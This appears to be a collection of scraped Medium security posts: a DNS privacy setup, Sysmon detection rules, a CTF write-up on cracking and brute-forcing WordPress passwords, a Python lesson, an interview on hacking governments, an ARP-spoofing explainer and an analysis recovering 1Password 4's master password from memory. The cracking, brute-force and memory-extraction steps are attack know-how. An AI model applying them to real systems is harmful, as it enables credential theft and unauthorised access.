Make sure you are careful with the spacing, YAML can be quite finicky about it. Next I comment out all of the other servers, make sure that Quad9 is the only one left. Save the file and we only have a couple of steps to go.
For Stubby to send outgoing DNS queries over TLS the resolvers configured on your machine must be changed to send all the local queries to the loopback interface on which Stubby is listening. To do this on my Mac, I run this command.
You can check in System Preferences that for the current network interface the DNS servers have changed to 127.0.0.1 and ::1. Looks like we’re ready to go, so the next step is to fire up Stubby pointing at the configuration file we just made and ensure that logging is enabled with -l so we can keep track of what its doing.
And behold…
To learn more about DNS Privacy, please visit https://dnsprivacy.org/ , a collaborative open project to promote, implement and deploy DNS Privacy.
Update 17 January 2018: In case you’re a Mac user, I’ve been running the alpha version of StubbyManager for MacOS with no problems for several weeks now.
Written by
","['DNS', 'How To', 'Open Source', 'Privacy', 'Cybersecurity']"
Putting Sysmon v9.0 AND/OR Grouping Logic to the Test,https://posts.specterops.io/putting-sysmon-v9-0-and-or-grouping-logic-to-the-test-c3ec27263df8?source=tag_archive---------8-----------------------,"Sysmon v9.0 is now available, and now permits AND or OR statements across rules. This is interesting and I believe might help some of the issues I have experienced when writing very specific signature-like rules.
In this short post, I will share a little bit of my initial exploration of the new AND/OR capabilities provided by the latest version of Sysmon, and provide a basic example of a potential rule that can be written with the new features.
Before installing or updating the schema version of current Sysmon configs, I believe it is important to go over some of the current Sysmon filtering capabilities and limitations to understand the potential value of this update.
Yes, and No! According to the Sysmon documentation, within a rule, filter conditions have an OR behavior by default.
If I wanted to do the following:
I would simply write the following rule:
You can run Sysmon in DebugMode (-t) and point it (-i) to your custom Sysmon config to see how the rule matches events on specific conditions.
C:\WINDOWS\system32>sysmon.exe -t -i c:\Users\cbrown\Downloads\test.xml
Now, if you decide to add a new condition with a different field name to the rule, the OR behavior is still respected. The rule will still match on any command line argument provided by powershell or cmd besides whoami.
In other words, if I wanted to do the following:
I could easily write the following rule:
Make sure you run Sysmon in DebugMode again and run a few tests
However, if I wanted to:
This would not be possible with Sysmon v8.04 and older versions.
The only AND statement that one was able to create until Sysmon V8.04 was by using Include and Exclude rules for the same ID (ProcessCreate, NetworkConnect, ImageLoad, etc).
For example, if I wanted to:
I would write the following rule:
You can verify that only events with the string whoami as part of the command line arguments are being excluded.
According to the Sysmon documentation:
It is also possible to override the way that rules are combined by using a rule group which allows the rule combine type for one or more events to be set explicitly to AND or OR.
Let’s install Sysmon v9.0 and start running some tests.
Every time there is a new Sysmon release, I highly recommend to document and understand potential changes to the overall event manifest or config schema.
Here is where you can find what schema version you need to use for your new Sysmon configs and the event schema for each Sysmon event. This does not provide detailed information of the new logic or features that can be defined in a Sysmon configuration. You can infer some of the new features by new event IDs or fields added to the event schema, but that is not enough. For this update, we will be updating the schema version to 4.2 .
You can get the event manifest information by running:
sysmon -s
You can also access the new Sysmon 9.0 event log manifest xml here
Sysmon uses document type definition (DTD) to validate the XML configs that you create. As my teammate Matt Graeber said in this awesome post, Sysmon should ship with an XSD �.
You can pull the DTD schema with strings.exe, but Matt already did that for you and has it available here. If you take a look at it, you will see that:
RuleGroup can be applied to every Sysmon event
RuleGroup has a name and groupRelation options
As you can see, the DTD schema also gives you field names and the valid logic that can be applied to them. This is very useful when you want to explore the new capabilities provided by each Sysmon release.
Now that we understand a few of the changes to the event and config schema, let’s start testing this new version.
Let’s see if we can do something similar to what was not possible with 8.04:
We have to create a RuleGroup and use the following schema for it:
Start Sysmon in DebugMode and test a few commands:
That is working the same way as before so far!
Now, what if I do not use whoami but ping as part of the command line arguments? . Unlike the previous Sysmon versions, this time I did not get any matches because of the new “and” groupRelation logic.
Nice! That works as expected now! . We can have the following logic working:
What if I want to create separate rule groups for each application (cmd and powershell). For example, I want to define two “and” groupRelations via two Inclusion filters:
When I try to debug the config, I get the following message:
Apparently, I cannot have two RuleGroup of the same filter type (i.e. Include-Include). What if I change the second filter type to an Exclusion and keep both “and” groupRelations applied to each RuleGroup?
That seem to work just fine!
Once again, we can have two groupRelations on the same ID (ProcessCreate, NetworkConnect, ImageLoad, etc), but not multiple filters (Inclusion-Exclusion) of the same type.
Let’s try that:
So far, Yes! The config is valid, so you can do that too.
However, our two rules did not match on our initial basic conditions �
That is because we are defining an AND-Inclusion with whoami as part of the command line arguments, and an OR-Exclusion with whoami as part of the command line arguments as well. Therefore, the OR-Exclusion will override the initialCommandLine condition. Be careful!
So far, I find these new features useful for a more targeted signature-like collection strategy approach.
For example, if I wanted to do the following in previous versions:
I had to write a rule like this:
However, as we already know, that rule will basically collect every event where the Image value of a process ends with powershell.exe and not necessarily when the ParentImage ends with WmiPrvSe.exe. Therefore, you will collect more events than what you originally want.
In the image below, we can see how there is a match, but by the Image condition only, and not by the combination of Image and ParentImage.
With Sysmon v9.0, you can re-write the rule the following way:
and get the following results:
You can test if you get other ProcessCreate events where the Image value of a process ends with powershell.exe only.
As you can see in the image above, all the other events with Image ending with powershell.exe and without ParentImage ending with WmiPrvSE.exe are excluded.
The event I captured above with the “Potential Lateral Movement via Wmi and PS” rule was the following:
Something to remember is that the new schema does not provide a new field for the RuleGroup feature. The value defined for the RuleGroup name variable is passed to the already existing RuleName field as shown in the image below:
Yes, you can do the same thing as in the previous versions and add multiple tags. You can still add ATT&CK tags � to your RuleGroups.
You will get the same RuleName syntax as shown below:
As you might have noticed, when you use the RuleGroup name for tagging, you are not setting a tag for each field-condition. You are tagging the whole group of field-conditions. However, you can still provide tags for each field-condition. Just remember that if you set both RuleGroup name and Field name tags, the tag at the field-condition level takes precedence.
If you are not parsing the RuleName field already, and you are using Logstash to transform your data, you could use the Logstash KV filter plugin to parse multiple tags (foo=bar syntax). I showed this here before.
According to Logstash documentation, the KV filter plugin helps to parse messages (or specific event fields) which are of the foo=bar variety.
If you decide to upgrade to version 9.0 and use the RuleGroup features, you will have to apply the following changes:
That will maintain the logic of your current rules. Make sure you do that to every ID (ProcessCreate, NetworkConnect, ImageLoad, etc.) and filter type (Include|Exclude)
If you decide to upgrade to version 9.0, but NOT use the new RuleGroup features, you can keep the schema version to 4.10 or below, and your config will still work like before (default OR behavior within conditions respected).
That’s it! I hope this post was useful for those wondering about the new features provided by the latest Sysmon release (v9.0). This was just my first attempt to understand the new capabilities, and I already see a few use cases for organizations to reduce the amount of data produced by very permissive configurations. Don’t get me wrong, I love to collect as much as I can after prioritizing what would provide enough context to validate the detection of adversarial techniques and sub-techniques, but it is also useful to be able to be specific in some areas and reduce the noise.
https://posts.specterops.io/categorizing-and-enriching-security-events-in-an-elk-with-the-help-of-sysmon-and-att-ck-6c8e30234d34
https://posts.specterops.io/working-with-sysmon-configurations-like-a-pro-through-better-tooling-be7ad7f99a47
https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon#event-filtering-entries
[UPDATE 02–22–19] Added extra information about keeping schema version lower than 4.2 to NOT use new features per feedback from @S0xbad1dea
Written by
","['About', 'All Posts', 'specterops.io', 'Download', 'Sysmon', 'Threat Hunting', 'Cybersecurity', 'Elasticsearch', 'Logstash']"
Pwning WordPress Passwords - InfoSec Write-ups - Medium,https://medium.com/bugbountywriteup/pwning-wordpress-passwords-2caf12216956?source=tag_archive---------5-----------------------,"In my last writeup, I recovered mysql credentials from a server and wrote a webshell to disk from there. This time, we’ll look at further leveraging the database contents by dumping hashes, cracking them with John The Ripper and also bruteforcing a WordPress login with Hydra.
To access the mysql service with a one-liner I used the following:
For real engagements and situations where there are security concerns with putting a password in plaintext, you can omit the -password flag and instead be prompted to enter the password upon connection.
Once we are connected to the service, we can begin enumerating what’s inside! First things first, let’s list the databases:
We can see there are several. The interest for today is wordpress however loot and proof were interesting and I encourage everyone to check them out themselves.
Let’s enumerate the wordpress database. To do this, we’ll have to select it:
Easy enough. Now let’s see what tables are in this database:
Ok, cool. This looks like where pretty much everything that needs to be stored on the blog is kept. Let’s check out the wp_users table to see if we can get some creds:
Looking at the Fields, it seems like we’ll be interested in user_login and user_pass. To view these fields:
We can also join these two files together to look like user:password:
We could just copy and paste this list since it’s only 16 entris. However we can also write this into a file and retrieve it from the server. In my previous post, we wrote a webshell through mysql and placed it in the /var/www/https/blogblog/wp-content/uploads/ directory.
And here are the hashes. We can curl this file directly off the server with:
-k to ignore the server’s self-signed certificate
Now that we’ve got the password hashes off the server, let’s get cracking! Since I’m running Kali in a VM, I am not able to run hashcat becuase I don’t have a GPU to run it on. My go-to for cracking hashes is John The Ripper and the rockyou wordlist. Not because these will always get me results, but because for CTF-style machines like many on VulnHub, if the hash is supposed to be cracked, these should do it.
These are phpass hashes which I had not had experience with before. I tried giving John The Ripper the user:pass format to crack the passwords and correlate them back to the username associated with it. However the file caused a formatting error which I did not expect. I was able to run John The Ripper successfully with just the hashes, no usernames.
The rockyou.txt wordlist cracked about half of the hashes. But now I had a different problem: Which password belongs to which account?
To correlate the usernames back to cracked passwords, I chose to use hydra. I copied the usernames into one file and the plaintext passwords another. Brute-forcing web logins is a little more involved than other services like ssh. This is because you have to provide the field names for each parameter as well as session cookies, and what an unsuccessful attempt looks like.
To get the neccessary field names, I fired up burpsuite and created a test login to intercept the fields that are sent during an authentication attempt.
I entered name as the username and secret as the password. When I intercepted the request with burpsuite, I was able to see that there were other fields that were also neccessary for a login attempt.
In total, I’ll need to specify four fields, log as the username, pwd as the password, wp-submit as the Log In, and testcookie being equal to 1. When WordPress redirects a successful authentication, the page contains Location in the source; this is not the case for failures. We can give all of this infomation to hydra in order to bruteforce these passwords. hydra uses ^USER^ and ^PASS^ as anchor fields to iterate through during a brute-force attempts.
-s to specify port 12380https-form-post to specify sending a post request over https/blogblog/wp-login.php is the login pagelog=^USER^ specify field for usernamepwd=^PASS^ specify field for password&wp-submit=Log In specify Log In button&testcookie=1 specify cookie name and valueS=Location signifies testing for succes and that success will contain ‘Location’-L specifies name of username list-P specifies name of password list
Since this command is rather long, I put it in a shell script for easy editing and saving for later and named it brute.sh.
Here we see that hydra was able to match all the passwords to their usernames in a matter of seconds! Bruteforcing is a noisy thing to do on a machine with any type of logging or monitoring. There is the potntial for tripping up an Intrusion Prevention System which could blacklist our IP. However since this machine did not have any sort of protective measures, we could have run hydra with our list of users and rockyou.txt as the password list and gotten the same results without John The Ripper.
We were able to crack multiple credentials for WordPress Administrators. These accounts have elevated privileges that allow them to potentially write arbitrary files to disk on the machine. This is a likely path to getting a shell on the box.
Written by
","['Archive', 'ABOUT US', 'Bug Bounty', 'CTF', 'Discord Server', 'Interviews', 'Discord Group', 'Hacking', 'Cybersecurity', 'WordPress', 'Passwords']"
Python for Cybersecurity — Lesson 1: Introduction to Python,https://medium.com/cyberdefenders/python-for-cyber-security-lesson-1-introduction-to-python-1976d817976?source=tag_archive---------2-----------------------,"Welcome to my first blog in the Python for Cybersecurity web course!
Wondering why specific focus is being given to cybersecurity or why should you bother? Well, the answer is pretty simple.
“You are only secure until you believe you are secure.”
Not making much sense, is it? In simple words, there is nothing secure in the internet — This is the bitter truth!
If someone says otherwise, do not believe them.
In most cases, much emphasis does not go into the security aspect of developing any product, solution or application, which backfires on the organization involved, when someone finally gains control of their resources and network through some simple vulnerability that existed. With the realization dawning on most of the organizations and companies, from startups to tech giants, all have started to emphasize on the importance of security. Thus cybersecurity has become one of the most in-demand fields.
Ever seen the following map before?
This live map in the norsecorp website gives you real-time information of which countries are currently being cyber-attacked! This is just one of those avenues to understand how the importance of enhancing cybersecurity in everything we build is the need of the hour — rather, need of the minute!
Now that we have made a little sense of why cybersecurity is important, let us dive into our first lesson!
In this lesson, we will learn about why Python is one of the most in-demand skills among cybersecurity recruits and also try to learn and understand the fundamentals of the language.
It doesn’t come as a surprise that Python is one of the most sought-after programming languages for cybersecurity considering its:
Everything from testing microchips at Intel, to powering Instagram, to building video games with PyGame, Python is the most sought after programming language for its power packed capabilities.
With that being said, let us dive into the first lesson of our Python for Cyber Security course — Introduction to Python!
To get started, ensure that your system has the following requirements fulfilled:
I will be using Jupyter Notebook predominantly throughout this course for the coding examples in Python.
In this section, we will be covering the basics of the Python programming language including the syntax and usage of:
Let’s roll!
Just like how any programming language introduction begins in this world, let us print “Hello World”.
There are a few rules that needs to be followed when it comes to naming variables in Python:
In Python, a function declaration begins with the keyword “def” for defining the function and ends with “:” marking the end of the declaration. In the example, we declare a function called my_new_function().
A recursive function is the one which calls itself inside its own definition (return statement calls the factorial function). In this case, the factorial function executes until the value of n equals 0.
These expressions allow us to create “anonymous” functions that are similar to the standard function definition. It is considered to be one of the most useful tools in Python since it allows us to create ad-hoc functions. For eg, let us take a square function declaration:
Now, let us re-write the same function using lambda expression:
Let us try to reverse a string input provided using lambda definition. This will give us a better understanding of its versatility.
lambda expressions are used widely along with with map(), filter() and reduce() functions.
In Python, we predominantly use two types of numbers which is Integers (positive and negative) and Floating Point numbers.
We are all familiar with the basic arithmetic operators (+,-,*,/) so let us dive into the other type of operators that can be used.
The comparison operators that are available for manipulation are “==”, “!=”, “<>”, “≤”, “≥”, “>” and “<”. You can do a multiple comparisons in a single line using Boolean operators.
All the basic loop structures like for, while, nested loops and if, elif and else statements, that you would find in any programming language, are available in Python as well.
The loop iterates over the items in order, executing the entire code block each time. We can use the range() function to specify the number of times we want the for loop to execute.
We can also specify the values to be evaluated in a for loop directly instead of range().
Similar to the for loop, let us see how the while loop functions. According the below function, the loop will execute until the count value is 1.
These statements in Python allows us to tell the computer to take alternative course of actions based on a certain set of results. Let us look at a simple example:
Python offers a variety of functions that can be done on a string object that eases the pain of printing the desired output. We can perform the basic string functions like upper(), lower() and capitalize() for upper case, lower case and sentence case respectively. Let us see some other interesting functions that are available to manipulate a string:
To check if the string is in some case, you can use the is<check>() methods like isalpha(), isspace(), isalnum(), islower() and isupper().
File objects can be used by Python to interact with the files in your computer. In order to understand this, let us see now see first open a file in write mode, write a line to it and try to read the file.
Data Structures in any programming language are used to store and retrieve information, which also defines the relationship between the data and operations that are authorized to be performed on that data. There are two types:
We have already discussed the primitive data structures above so let’s move on to the non-primitive ones. Of all the aforementioned, Lists and Dictionaries are the most popular ones to be used by the developers.
A list holds an ordered collection of items which can be strings, integers, etc. The items need to be closed in “[]” square braces to indicate that the group of items needs to be treated as a list. Let us try to understand the data structure and the various methods used with it.
When we type the name of the list with a ‘.’ in the end and press the TAB key, we will be able to see the various methods that can be used on the list which includes append(), count(), reverse(), extend(), insert(), pop(), remove() and sort(). Let us see a few of them and their functioning through the code sample:
In Python, arrays are not so popular as lists when compared to their use in other programming languages. The prime difference between them is that all the elements in an array need to be of the same datatype. Arrays are declared using the array module, which needs to be imported before initializing them. The data type of the array has to be specified during the array creation.
Dictionaries are made of key-value pairs, where key is used to identify the item and the value holds the value of the item. Let us see how to declare a dictionary say “dicts” and try to iterate through each item using the items() function.
Tuples look similar to lists except for the declaration in “( )” instead of “[ ]”. They are used to hold together objects that are immutable, in simple terms, the values cannot be modified.
Regular expressions are used for finding matching patterns of text which works with a formal syntax. It is shortly known as REGEX. It is predominantly used in solving parsing problems. Let us see a code sample that can be used to determine the strength of a password depending on the constraints matching the regex pattern.
As you can see, re.search() function is used to search for matching strings, which is then compared with the input string my_pass. The other functions that are commonly used with regex are compile(), findall() and match().
With this, we end our first lesson in our path towards learning Python for Cyber Security.
Watch out for the next post soon!
Happy Learning!!
Written by
","['About Us', 'The Lab', '2018 Team Projects', 'Industry Partners', 'Archive', '2018 Program', 'Python Programming', 'Cybersecurity', 'Coding', 'Python4cybersecurity']"
Q&A: Meet the hacker that can overthrow a government.,https://medium.com/un-hackable/q-a-meet-the-hacker-that-can-overthrow-a-government-with-just-a-laptop-531a6bcc3b12?source=tag_archive---------5-----------------------,"DEFCON is one of the oldest and largest hacking conventions in the world, with more than 20,000 attendees from around the world. It seems hard to create a sensation at an event where the staff are officially referred to as “goons” and the rules of conduct (according to DefCon’s FAQ) include things like don’t throw “lit road flares in elevators,” but in 2015, Chris Rock did just that with his presentation “I Will Kill You and Birth You: How to kill someone and bury the body yourself without a shovel, and How to make Babies and then Harvest them.”
In the space of less than an hour, Rock (who is the CEO of Kustodian, an Australian computer security company) exposed the terrifyingly porous patchwork of protocols governments around the world rely on to officially declare a person dead — or living. He conjured a dystopian world of fake babies whose “burner identities” could be used to rake in millions, and revenge “killings” that take place remotely, by digitally declaring your enemies dead.
This was the cheery sort of stuff I had hoped to discuss with him via Skype the week before DefCon, but instead Chris offered me a preview of his forthcoming talk at DefCon 2016, How to Overthrow a Government, in which he describes a variety of hyperrealist scenarios by which cyber-mercenaries can engineer regime change, anonymously, from behind the safety of their own laptops. Chris didn’t want to reveal the full content of his talk before DefCon, so we mostly discussed the fascinating story behind the story: how he learned to think like a cyber-mercenary.
—
How did you get started on the topic of cyber coups and remote regime change? In 2009, I was asked to look at the security of Kuwait by the Interior Ministry from a hacker perspective and see how they stood up against outside threats, not [internal] revolutions or coups. They wanted me to look at government banks, power and gas, that kind of stuff.
We hacked into the country’s assets to show the Interior Ministry the effects of what a hacker could achieve in the country of Kuwait. At that same moment there were allegations of money being transferred from the Central Bank of Kuwait to private banks and abroad. Here we were with our hands in the public and private tills, when there was already something going on! We then had the idea of capitalizing on this scenario. Instead of showing the Interior Ministry we hacked this and we hacked that, let’s make a bigger story, combine the hacks and showed what hackers could really do. With the Arab Spring, it was perfect timing. So we ran in parallel with real events to then show the Minister what could be achieved — not just this bank is weak, or this infrastructure is weak. I did all this work. Over a year’s worth of work! Hacking into banks, blah, blah, blah. But after I showed them how to hack into these organizations, no work came out of it for me. They pretty much used me for my work and didn’t renumerate—they didn’t honor their agreement. By the end of this effort, I had hacked into those various targets and aligned them into a presentation titled “Revolution of 2011.” Ironically, Kuwait had become engulfed by real protests. Then the Prime Minister resigned and we lost all contact with them. So you were like, “I may as well put all this research to use…”? Exactly. There was no non-disclosure agreement.
Then, working with Simon Mann, an old school mercenary, I learned where we went wrong, what we did right, how he would have done it, and meshed it all together.
But years went by before you contacted Simon Mann to learn how real mercenaries would engineer a coup. What brought you back to your Kuwait research? What kicked this off is for me is when James Clapper, a National Intelligence Director, announced ISIS has now overtaken cyber-espionage as the biggest world threat. We’ve dropped our position on the leader board! [Until recently, cyber espionage was in first place.] And I thought: I really have to bring out the big guns to show hackers they need to focus on the bigger target, not just the bigger bank or government institution. Put your heads together to do a proper hack, because we’re dropping down the list! We’re getting overtaken by people like ISIS as the biggest world threat! It’s an entertaining talk. And from there it was just a quick jump to training to be a cyber-mercenary with Simon Mann…? I’ve always known how to be a cyber-mercenary in a way. As a pen tester, you get asked to do a lot of dodgy stuff. Certain tasks that aren’t necessarily… legal. Not that we take these assignments, but you then get to see how businesses operates without the normal legal constraints. This includes organized crime syndicates — the kind of people that can make money disappear at a bank after an illegal transfer. I’ve also sort of seen the underworld of hacking during my career. I hang around the black hat crowd. But I got to learn how the way the world really works behind the scenes — not just what we see in the news — by studying how a coup works inside and out. Simon is really the key to the whole talk. I thought: I needed to step out of my own industry, consult with an expert, and join the two professions [that of mercenary and cyber-security specialist] together. So how did you meet Simon and get him to take you on as a protégé? I saw a documentary that he was in and thought he was very articulate. So I contacted him on Twitter, and he and I started corresponding over email. Then I asked him for his assistance. Being that he’s a mercenary, all I had to do was pay him and he was very happy to help. That’s how they operate. Once you pay them, they’re yours! But weren’t you worried that his knowledge would be a little dated and, you know, analog? The coup he tried to precipitate in Equatorial Guinea took place back in 2004. I thought the same thing. I thought his techniques would be, “Oh, there’s an electrical substation transformer that I’ll just go blow it up with some C-4 explosives to stop electricity going to a certain region.” Obviously, all I needed to hear was, “I need to stop power.” I don’t have C-4 in my pocket, but I could use digital components and do it that way. In the talk, for example, you will see me using a drone and circular cutting saw blades to disable power lines.
It’s not that it’s outdated; it’s different. But the info he has in his brain is unbelievable. If I gave him a country to study, he would learn that country inside and out. He’s probably one of the most intelligent men I’ve ever met.
So what did your crash course in coup-engineering involve exactly? Simon made me read close to 80 books before we would even work together: historical coups, revolution, strategy, all that sort of stuff. I was his apprentice for 3 or 4 months before we really started working together. He also got me to study the fake coups, like the one that he was involved in, where the president of Equatorial Guinea would arrest his opposition leader if he began making any traction and claim [his opponent was plotting a political] coup, even though he wasn’t. I really enjoyed learning the political strangling points.
From there, we went over my Kuwait research and Simon was more, “You did this wrong. You should have done this. You should have done that. Next time do that. If you wanted to do it again in 2016, I recommend the following…”  So how easy is it to hack, say, the central bank of a given country? Easy. Easy. Easy. It’s like fly swatting. Whether you go through the front door or you pay someone to walk in the building and implant something on the back of a computer. It’s laughable. It’s just a joke. A lot of hackers out there could easily do it without blinking an eye. I know the American government now has a digital domain trying to disrupt Syria or ISIS and they’re not getting the results they would like. I would just like to show them there are other areas to target. The threat is seems so nebulous. Or maybe just the opposite: everywhere at once. How does a government protect itself? It can’t. It’s a joke to even say that it could. We’re at a tipping point now, where if someone like myself on the negative side of the world uses tactics like these, there’s nothing you could do. We’re starting to see some snippets of it now with the hack of the DNC emails. It’s tiny techniques, which, if combined together could decide who becomes president. So do you believe the Russians were behind the release of those emails? It’s too early. You, as a journalist, could study it for the next year and you will not know, because the whole idea of these operations is they’re done so you don’t know who is behind them. But for the cyber mercenary, it’s all about studying these techniques for use in future revolutions, election rigging or coups.
It seems like you could combine your two lines of research and propose a scenario where a fake baby helps cyber-engineer a fake coup. Ha! I was thinking the fake babies could be used by a criminal syndicate — a mafia type organization to launder money through — but you’re right. You could use them to overthrow a government for profit. When you did all your death hacking research, was anyone actually doing this stuff — killing people off digitally, creating fake birth certificates, etc. — or was it more like, Wow, criminals are idiots because they’re not doing this? Criminals are idiots. I looked at every news report that I could find and every police report that I could get my hands on. The only thing were cases where funeral directors was doing dodgy paperwork. I don’t think there are a lot of people who combine a lot of these processes together, looking at the individual weak points in the system and then putting them together. I know the hackers aren’t doing it, because they don’t think like that. That’s the problem. That’s the purpose of the talk, to get them to think outside the tech box and look at the whole.
Practically Unhackable is an Intel publication built for anyone who uses the internet — someone like you! Take your first steps to a safer online life with our step-by-step guides on everything from managing passwords to tackling ransomware.
Written by
","['Cybersecurity', 'Hacking', 'Security', 'Technology', 'Interview']"
¿Qué es el envenenamiento ARP o ataque ARP Spoofing y ¿Cómo funciona?,https://medium.com/@marvin.soto/qu%C3%A9-es-el-envenenamiento-arp-o-ataque-arp-spoofing-y-c%C3%B3mo-funciona-7f1e174850f2?source=tag_archive---------0-----------------------,"Un ARP Spoofing es una especie de ataque en el que un atacante envía mensajes falsificados ARP (Address Resolution Protocol) a una LAN.
Como resultado, el atacante vincula su dirección MAC con la dirección IP de un equipo legítimo (o servidor) en la red.
Si el atacante logró vincular su dirección MAC a una dirección IP auténtica, va a empezar a recibir cualquier dato que se puede acceder mediante la dirección IP.
ARP Spoofing permite a los atacantes maliciosos interceptar, modificar o incluso retener datos que están en tránsito. Los ataques de suplantación ARP ocurren en redes de área local que utilizan protocolo de resolución de direcciones (ARP).
Los ataques ARP Spoofing pueden tener efectos graves para las empresas. En su nivel más básico, los ataques de suplantación ARP se utilizan para robar información sensible de la empresa. Aparte de esto, los ataques de suplantación de ARP se utilizan a menudo para facilitar otros ataques como:
De denegación de servicio ataques (Denial-of-service attacks): ataques DoS utilizan ARP Spoofing para enlazar varias direcciones IP en una LAN con la dirección MAC de un solo objetivo. Debido a esto, el tráfico que está destinada a diferentes direcciones IP será redirigido a la dirección MAC del destino, sobrecargando así el objetivo con el tráfico.
Secuestro de sesiones (Session hijacking): ataques de secuestro de sesión pueden hacer uso de ARP Spoofing para robar los identificadores de sesión, garantizando así el acceso a los atacantes y los sistemas privados de datos.
Ataques tipo Hombre en el Medio (Man-in-the-middle Attacks): Los ataques MITM pueden utilizar ARP Spoofing para interceptar y/o modificar el tráfico entre dos víctimas.
Típicamente los ataques de suplantación de ARP siguen algunos pasos similares, que incluyen:
Detección, Prevención y Protección contra el ARP Spoofing
Los siguientes métodos son medidas recomendadas para la detección, prevención y protección contra ataques de suplantación ARP:
El filtrado de paquetes: Los filtros de paquetes inspeccionan los paquetes que se transmiten a través de una red. Los filtros de paquetes son útiles en la prevención ARP Spoofing, ya que son capaces de filtrar y bloquear los paquetes con información de la dirección fuente de conflicto (paquetes desde fuera de la red que muestran las direcciones de origen desde el interior de la red y viceversa).Utilice software de detección de ARP Spoofing: Hay muchos programas disponibles que ayudarán a las organizaciones a detectar ARP ataques de suplantación. Estos programas funcionan básicamente mediante la inspección y la certificación de los datos antes de su transmisión y el bloqueo de los datos, que parece ser falsa.Utilizar protocolos de red criptográficos: Transport Layer Security (TLS), Secure Shell (SSH), HTTP seguro (HTTPS) y otros protocolos de comunicaciones seguras refuerzan la prevención de ataques ARP Spoofing mediante el cifrado de los datos antes de la transmisión de datos y mediante la autenticación cuando se reciben.
Written by
","['Cybersecurity', 'Seguridad Informatica']"
Recovering the Master Password from a Locked Password Manager (1Password 4),https://blog.securityevaluators.com/recovering-the-master-password-from-a-locked-password-manager-1password-4-5d32cd569907?source=tag_archive---------4-----------------------,"We love password managers; they are great for many reasons. Myself, I have over 200 password entries. With so much sensitive data entrusted into a single application, it’s import to understand what one’s exposure is in terms of credential loss on a compromised machine, be it malware, post exploitation scenarios (looking at you, Adobe Flash), or if you forget to lock your workstation when you walk away for a few minutes. The Washington Post recently published an article based on our study of various password managers to spread awareness that not all password managers are created equal.
I religiously kept my password manager locked, assuming a securely locked password manager would thwart any malicious activity and the most someone could steal is a bunch of random data since I trusted my password manager to scrub any sensitive entries from memory once I locked it.
This is true for 1Password 4 (note, 1Password 7 is the latest version), before I switched to it, years ago, I did a brief evaluation to confirm that my entries did not exist in memory once I placed it into a locked state, confirming they were carefully managed and removed from memory. At most if my laptop were stolen or someone walked by to interact with my password manager they would be pitted against a locked vault.
In this state, my password entries and my master password did not exist in memory. A very reasonable and low standard for a password manager to adhere to, and 1Password 4 passed. Or did it?
To spare the boring details, we were able to recover the master password from a locked instance in 1Password 4, as demonstrated in the GIF below.
In the above GIF we first unlock 1Password 4 as we would through normal use. Then we lock it.
Once it’s locked we run a utility we created called ‘multipass’, which will be made public at a later date. This utility exploits a flaw in the way 1Password 4 handles the password input edit box to recover an obfuscated master password buffer, de-obfuscate it, automagically unlock 1Password 4 and finally log the master password to the console.
The first step when evaluating a password manager is to see if the master password is exposed in memory in the clear. This can be done by using a simple hex editor that has the ability to interact with a process address space. HxD hex editor is one, for example (and it’s free!). Using HxD we can point it at the address space of 1Password 4.
And we land at an interface that lists the first readable region of 1Password 4’s memory space.
Nothing too exciting as of yet. We can also search the entire address space of a process. For example, what if we fill in the master password in 1Password 4’s unlock dialog but don’t click the ‘unlock’ button:
Surely, the password is in memory somewhere?
Using HxD to search memory for a partial string of our master password (“Z3Superpass#”), yields no results.
1Password must be encrypting or performing another form of obfuscation on the entry as we type it in. Is this good enough, should we leave it alone?
To find out why our master password is not in memory while it is clearly filled into the unlock dialog, we must locate the code that interacts with it. There are multiple ways of doing this. One could identify the message loop that captures keyboard and mouse activity by locating ‘GetMessage’, ‘PeekMessage’, ‘GetWindowText’ or other Window’s APIs that typically handle user input to locate the buffer our keystrokes are being captured into and following it until we reach an encryption/obfuscation routine. This can get cumbersome and be an error prone process, especially with thick frameworks that have weird memory management that will require you to follow the buffer through numerous of copies and transformations.
Instead, we’ll use an in-house tool (‘Thread Imager’) created for reverse engineering ‘weird’ proprietary protocols at the application layer to identify where 1Password 4 interacts with our master password. The following image is of this tool ‘automagically’ identifying code areas in 1Password 4 that interact with the obfuscated password (In short, instructions that interact with data of interest, in this case, ‘Z3superpass#’, our master password, are flagged by this tool for further analysis). The output looks something like this:
Since the master password exists in memory in an obfuscated format, we anticipate, that the first result returned by our tool would be where the master password buffer is decrypted/de-obfuscated.
An excerpt of the first result identifies that our master password first appears when code was transitioning from 0x7707A75D -> 0x701CFA10.
Examining the above code location, 0x7707A75D, in a debugger (x64dbg), we confirm our theory in that we first identify ‘Z3superpass#’ at the end of a decoding function, ‘RtlRunDecodeUnicodeString’, inside ntdll.dll.
After some brief analysis we notice that ‘RtlRunEncodeUnicodeString’ and ‘RtlRunDecodeUnicodeString’ are used to obfuscate the master password memory region to conceal it from trivial memory forensics, explaining why we couldn't locate it in HxD earlier.
If we examine the encoded buffer at the end of the ‘RtlRunEncodeUnicodeString’ function we can see the encoded master password string looks like this:
After ‘RtlRunDecodeUnicodeString’, decoded, it looks like:
Interestingly, this memory region persists at the same location in an instance of 1Password 4, at 0x00DFA790, and we can watch it as we type in the master password into the 1Password 4 unlock dialog:
‘RtlRunEncodeUnicodeString’ and ‘RtlRunDecodeUnicodeString’ are simple functions that mask a string using a single byte as the XOR value. This isn't too bad, and apparently this is how all Windows’ native edit controls that are passed the ‘ES_PASSWORD’ flag to make it a masked password control, work.
However, upon unlocking 1Password 4 we notice that the encoded master password is not cleared from memory:
Even worse, it is still in memory after we lock 1Password 4. So now we have a locked password vault, but with the encoded master password left residing in memory.
And to make matters worse, as we interact with the master password entry dialog, the same memory region is reused along with the same XOR byte value — giving us easy access to the encoded buffer to craft an exploit.
To craft a 1Password 4 version-agnostic exploit we needed to get a clearer picture of whats going on to identify how our master password was handled by 1Password 4’s workflows. We charted the output (Figure Below) by using details obtained from our tool.
Using the figure above we had a big picture idea of what libraries were involved to better identify areas, outside of 1Password 4 binaries, where we could extract the master password.
Where we are now, is a locked password manager that somewhere in memory has an obfuscated password that was not properly scrubbed from memory:
To extract the master password we must trigger a routine in 1Password 4 that initiates ‘RtlRunEncodeUnicodeString’ and ‘RtlRunDecodeUnicodeString’, to give us the location of the memory buffer of the previously encoded master password.
Without this buffer, we would have to dive down the rabbit hole of the internals of Windows’ common controls and their associated memory management mechanisms to figure out where the memory buffer behind the master password edit control is (Which may be easy!, but we didn't take that route).
